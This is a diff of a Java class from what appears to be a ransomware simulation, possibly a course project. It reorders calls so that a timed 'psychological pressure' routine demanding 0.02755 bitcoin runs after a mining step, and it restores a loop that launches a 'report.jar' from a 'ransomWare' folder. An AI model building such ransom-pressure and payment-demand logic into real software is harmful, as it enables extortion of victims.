@@ -31,12 +31,11 @@ public class Application {
         Scanner scanner = new Scanner(System.in);
         String input = "";
 
-        pressure(scanner, input);
 
-        /*do{
+        do{
             input = scanner.nextLine();
         }while(!(input.contains("launch") && input.contains("report.jar")));
-        report(scanner, input);*/
+        report(scanner, input);
 
         System.out.println();
 
@@ -58,6 +57,8 @@ public class Application {
         int n = rand.nextInt(3);
 
         miners.get(n).mine(block01);
+
+        pressure(scanner, input);
     }
 
     public static void report(Scanner scanner, String input) {
@@ -70,9 +71,7 @@ public class Application {
         EncryptionDecryption encryptionDecryption = new EncryptionDecryption();
 
         boolean transactionSuccessful = false;
-        boolean timeOver = false;
-        float bitcoinAmountForDecryption = 0.02755f;
-        String transactionState = "transaction";
+
 
         try {
             ProcessBuilder processBuilder = new ProcessBuilder("C:\\Program Files\\Java\\jdk-17.0.1\\bin\\jarsigner", "-verify", "ransomWare/report.jar");
@@ -162,7 +161,7 @@ public class Application {
 
         Timer pressureTimer = new Timer();
         PsychologicalPressure psychologicalPressure = new PsychologicalPressure(0.02755f, ransomWareController);
-        pressureTimer.scheduleAtFixedRate(psychologicalPressure, 6000, 6000);
+        pressureTimer.scheduleAtFixedRate(psychologicalPressure, 60000, 60000);
 
         do {
             input = scanner.nextLine();
